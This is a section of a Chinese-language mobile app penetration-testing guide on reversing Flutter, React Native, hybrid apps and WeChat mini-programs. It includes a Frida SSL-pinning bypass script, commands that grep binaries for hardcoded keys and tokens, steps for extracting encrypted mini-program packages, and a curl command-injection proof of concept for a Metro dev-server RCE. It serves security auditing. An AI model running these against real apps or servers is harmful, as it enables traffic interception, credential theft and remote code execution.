## 八、跨平台框架漏洞与逆向

### 8.1 Flutter（Dart AOT 逆向）
Flutter 将 Dart 编译为 AOT 机器码（`libapp.so`），jadx 看不到业务逻辑，需专用路线：
```bash
# 结构识别
unzip -l app.apk | grep -E "libflutter.so|libapp.so|assets/flutter_assets"
# libflutter.so=引擎, libapp.so=Dart AOT业务代码(逆向核心)

# 逆向工具链
# Blutter (worawit/blutter): 恢复Dart类/方法名/字符串池（首选）
blutter.py libapp.so libflutter.so ./out

# reFlutter: 反混淆/重打包（恢复可读性 + 支持重签名安装）

# 字符串搜索（快速找硬编码密钥/API）
strings libapp.so | grep -iE "api|secret|token|http|aes|key"
```
**Flutter 抓包与 Hook：**
```
1. 证书校验函数: libflutter.so 中 ssl_crypto_x509_session_verify_cert_chain → Interceptor.replace返回1
2. 通用: hook libflutter.so 中 dart 层网络栈（dio/http）→ 或直接hook底层boringssl
3. Objection: android sslpinning disable 对Flutter部分有效（native层仍需手动）
4. RSA/AES业务加密: hook pointycastle/cryptography 库的Dart函数(用Blutter恢复符号后精确hook)
```
```javascript
// Flutter SSL绕过（native层）
var sslVerify = Module.findExportByName("libflutter.so", "ssl_crypto_x509_session_verify_cert_chain");
if (sslVerify) Interceptor.replace(sslVerify, new NativeCallback(function(){
    return 1;
}, "int", ["pointer"]));
```

### 8.2 React Native
```bash
# JS bundle提取
unzip -l app.apk | grep -iE "index.android.bundle|assets/"
unzip -o app.apk "assets/index.android.bundle" -d rn/
# 直接搜索bundle内硬编码
grep -oE "(api[_-]?key|token|secret)\W*[:=]\W*[\"'][^\"']+" assets/index.android.bundle | head

# Hermes字节码（新版本RN使用, bundle为.hbc）
npx hermes-dec hbc:app.hbc -out app.js    # 反编译Hermes字节码

# 开发服务器攻击面（供应链/研发侧）
# CVE-2025-11953: @react-native-community/cli Metro dev server RCE
# 根因: Metro默认绑定0.0.0.0 + /open-url端点未过滤输入 → open()命令注入 → 宿主机RCE
# CVSS 9.8, 影响 CLI server api 4.8.0~20.0.0-alpha.2 → 升级至20.0.0+ / 绑定127.0.0.1
# 验证: curl -X POST http://<dev>:8081/open-url -d '{"url":";id;echo pwned"}'
```

### 8.3 uni-app / Cordova / 混合应用
```bash
# uni-app(HBuilder打包): 业务逻辑在资源中
unzip -l app.apk | grep -iE "www/|__uniapp|app-service.js|vendor.js"
# Cordova: www/ 目录为完整前端
# 直接审计js即可定位API/密钥/逻辑漏洞; 关注WebView bridge(见第十章)
```

### 8.4 小程序逆向（微信/支付宝等）
```bash
# wxapkg 包提取（Android: /data/data/com.tencent.mm/.../appbrand/pkg/*.wxapkg）
adb shell "find /data/data/com.tencent.mm -name '*.wxapkg' 2>/dev/null"
# 解密（微信小程序AES加密, 密钥版本相关: 旧版固定,新版从wasm提取）
# 工具: wxappUnpacker / wxapkg解密脚本(需配合内存dump取密钥)
# 反编译后: 审计JS逻辑（与RN bundle类似方式）
# 小程序特有攻击面: 开放数据域/云函数(cloud.callFunction)未鉴权、跳转参数注入、webview组件
```

